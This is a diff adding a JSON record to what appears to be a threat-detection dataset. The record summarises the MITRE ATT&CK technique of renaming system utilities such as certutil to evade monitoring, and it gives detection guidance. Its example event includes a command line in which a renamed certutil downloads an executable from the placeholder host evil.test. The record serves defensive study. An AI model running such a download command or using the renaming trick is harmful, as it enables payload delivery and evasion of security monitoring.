@@ -1,0 +1,17 @@
+{
+  "id": "attack-t1036-003-rename-system-utilities",
+  "partition": "red",
+  "title": "Masquerading: Rename System Utilities (T1036.003)",
+  "source": "MITRE ATT&CK",
+  "provenance": "verbatim summary — fetched from attack.mitre.org 2026-07-14",
+  "source_url": "https://attack.mitre.org/techniques/T1036/003/",
+  "techniques": ["T1036.003"],
+  "tactic": "Defense Evasion (TA0005)",
+  "text": "Adversaries rename legitimate system utilities such as certutil.exe, rundll32.exe, mshta.exe, or powershell.exe to evade security monitoring that keys on the utility name or Image path. Copying a signed LOLBin to an innocuous or business-looking filename (e.g. AdobeUpdater.exe), or relocating it to a non-standard directory, bypasses detection controls that rely on the on-disk name/path. Procedure examples: APT38 renamed rundll32.exe and mshta.exe to avoid detection; Daggerfly used a renamed rundll32.exe called dbengin.exe in ProgramData to proxy malicious DLL execution. Detection guidance: monitor for execution where the on-disk filename does not match PE metadata OriginalFileName / InternalName, rather than relying on the Image path alone. This is the canonical evasion for LOLBin download rules anchored on Image.",
+  "example_event": {
+    "Image": "C:\\Users\\Public\\AdobeUpdater.exe",
+    "OriginalFileName": "CertUtil.exe",
+    "CommandLine": "AdobeUpdater.exe -urlcache -split -f http://evil.test/p.exe C:\\Temp\\p.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  }
+}
